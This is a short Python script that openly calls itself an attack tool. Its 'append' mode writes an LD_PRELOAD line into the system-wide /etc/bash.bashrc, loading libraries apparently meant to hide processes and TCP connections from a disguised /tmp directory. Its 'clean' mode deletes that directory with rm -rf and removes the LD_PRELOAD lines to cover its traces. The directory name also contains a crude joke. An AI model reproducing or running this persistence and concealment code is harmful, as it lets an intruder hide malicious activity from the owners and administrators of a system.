import os
import subprocess
import sys

def append_to_bashrc(line_to_append):
    bashrc_path = os.path.expanduser('/etc/bash.bashrc')
    try:
        with open(bashrc_path, 'a') as bashrc_file:
            bashrc_file.write("\n" + line_to_append + "\n")
    except Exception as e:
        print(f"Error: {e}")


def clean_up():
    # Delete the specified directory
    command = "rm -rf /tmp/notverysusciousfilecontainingnogayporn"
    subprocess.run(command, shell=True, check=True)

    # Function to remove lines containing 'export LD_PRELOAD' from a file
    def remove_ld_preload_line(file_path):
        try:
            # Read the contents of the file
            with open(file_path, 'r') as file:
                lines = file.readlines()

            # Write back all lines that don't contain 'export LD_PRELOAD'
            with open(file_path, 'w') as file:
                for line in lines:
                    if 'export LD_PRELOAD' not in line:
                        file.write(line)

        except IOError as e:
            print(f"An error occurred while processing {file_path}: {e}")

    # List of files to process
    files_to_process = ["/etc/bash.bashrc", "kolokasi/.bashrc"]

    # Process each file
    for file_path in files_to_process:
        remove_ld_preload_line(file_path)



if __name__ == "__main__":
    argc = len(sys.argv)
    argv = sys.argv
    if argc == 1:
        print("specify attack")
    elif argc >= 2:
        if argv[1] == "append":
            not_suspicious_dir = "/tmp/notverysusciousfilecontainingnogayporn"
            library_pid1_path = os.path.join(not_suspicious_dir, "library_pid1.so")
            library_tcp_hider_path = os.path.join(not_suspicious_dir, "library_tcp_hider.so")
            preload_command = f"export LD_PRELOAD={library_pid1_path}:{library_tcp_hider_path}"
            append_to_bashrc(preload_command)
        if argv[1] == "clean":
            clean_up()
